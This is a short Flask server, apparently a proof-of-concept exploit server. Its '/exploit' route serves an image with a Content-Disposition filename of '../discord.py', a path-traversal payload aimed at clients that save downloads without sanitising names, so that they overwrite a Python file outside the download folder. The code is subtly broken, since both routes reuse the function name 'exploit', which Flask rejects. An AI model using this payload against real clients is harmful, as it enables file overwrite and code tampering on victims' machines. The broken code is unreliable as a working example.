from flask import Flask, send_file, make_response

app = Flask(__name__)

@app.route('/exploit')
def exploit():
    caminho_imagem = 'tests/teste_imagem.png'
    filename = '../discord.py'
    with open(caminho_imagem, 'rb') as img_file:
        img_data = img_file.read()
    resposta = make_response(img_data)
    resposta.headers['Content-Type'] = 'image/png'
    resposta.headers['Content-Disposition'] = f'attachment; filename={filename}'
    return resposta

@app.route('/image')
def exploit():
    caminho_imagem = 'tests/dog.png'
    filename = 'dog.png'
    with open(caminho_imagem, 'rb') as img_file:
        img_data = img_file.read()
    resposta = make_response(img_data)
    resposta.headers['Content-Type'] = 'image/png'
    resposta.headers['Content-Disposition'] = f'attachment; filename={filename}'
    return resposta


if __name__ == '__main__':
    app.run(port=8080)
